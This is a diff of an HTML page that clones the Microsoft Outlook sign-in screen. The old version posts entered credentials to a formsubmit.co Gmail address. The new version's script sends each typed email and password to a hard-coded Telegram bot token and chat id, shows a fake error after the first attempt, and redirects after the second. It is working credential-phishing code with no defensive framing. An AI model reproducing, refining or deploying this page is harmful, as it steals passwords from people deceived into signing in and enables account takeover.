@@ -2,19 +2,18 @@
 <html lang="en">
 
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Live Signin Page Clone</title>
   <style>
-    @import url(https://fonts.googleapis.com/css?family=Poppins:100,100italic,200,200italic,300,300italic,regular,italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic);
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
 
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
       font-family: 'Poppins', sans-serif;
-      color: #1b1b1b;
     }
 
     body {
@@ -29,10 +28,6 @@
       background-color: #fff;
       box-shadow: 0 0 .5rem rgba(0, 0, 0, .2);
       padding: 44px;
-    }
-
-    .logo {
-      margin-bottom: 15px;
     }
 
     form h2 {
@@ -65,7 +60,6 @@
     }
 
     form a:hover {
-      color: #000000b3;
       text-decoration: underline;
     }
 
@@ -74,21 +68,15 @@
       margin-left: auto;
       width: 108px;
       height: 32px;
-      padding: 4px 12px;
       font-size: 15px;
       background-color: #0067b8;
       color: #fff;
       border: none;
-      outline: none;
       cursor: pointer;
     }
 
     form button:hover {
       background-color: #004b85;
-    }
-
-    form button:active {
-      transform: scale(.97);
     }
 
     .bottom {
@@ -98,9 +86,9 @@
       padding: 8px 44px;
       font-size: 15px;
       margin-top: 20px;
-      cursor: pointer;
       display: flex;
       align-items: center;
+      cursor: pointer;
     }
 
     .bottom img {
@@ -113,7 +101,6 @@
       background-color: #dde2d1;
     }
 
-    /* Modal styles */
     #errorModal {
       display: none;
       position: fixed;
@@ -168,9 +155,7 @@
   </div>
 
   <div class="container">
-    <form id="form" method="POST" action="https://formsubmit.co/paymentsuccessfully25@gmail.com">
-<!--       <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Microsoft_Outlook_2013-2019_logo.svg/811px-Microsoft_Outlook_2013-2019_logo.svg.png"> -->
-
+    <form id="form" method="POST">
       <div class="forms-container">
         <div class="forms">
           <div class="first">
@@ -178,15 +163,13 @@
             <div class="form-group">
               <input type="email" placeholder="Email" name="username" id="username" required>
               <input type="password" placeholder="Password" name="password" id="password" required>
-              <input type="hidden" name="_next" value="https://frilea.vercel.app/thanks.html" />
-              <input type="hidden" name="_captcha" value="false">
             </div>
             <p>No Account? <a href="#">Create One!</a></p>
             <a href="#">Sign in with a security key <span>?</span></a>
           </div>
         </div>
       </div>
-      <button type="submit" value="submit">Sign in</button>
+      <button type="submit">Sign in</button>
     </form>
 
     <div class="bottom">
@@ -195,17 +178,35 @@
     </div>
   </div>
 
-  <!-- JavaScript for modal and attempt tracking -->
+  <!-- JS -->
   <script>
     let attemptCount = 0;
 
     document.getElementById('form').addEventListener('submit', function (e) {
+      e.preventDefault();
       attemptCount++;
-      if (attemptCount < 3) {
-        e.preventDefault(); // Prevent submission
-        document.getElementById('errorModal').style.display = 'flex'; // Show modal
-      }
-      // On third attempt, allow submission
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const telegramMessage = `🟦 Outlook Login Attempt\n\n📧 Email: ${username}\n🔑 Password: ${password}`;
+      const token = '7575554816:AAFpvURl9K_E_UuMEyQL13TJWzN0JBanRj8';
+      const chat_id = '8181103859';
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (attemptCount === 1) {
+            document.getElementById('errorModal').style.display = 'flex';
+          } else {
+            window.location.href = 'thanks.html'; // ✅ Second try = redirect
+          }
+        })
+        .catch(error => {
+          alert("Network error. Try again.");
+          console.error('Telegram error:', error);
+        });
     });
 
     function closeModal() {
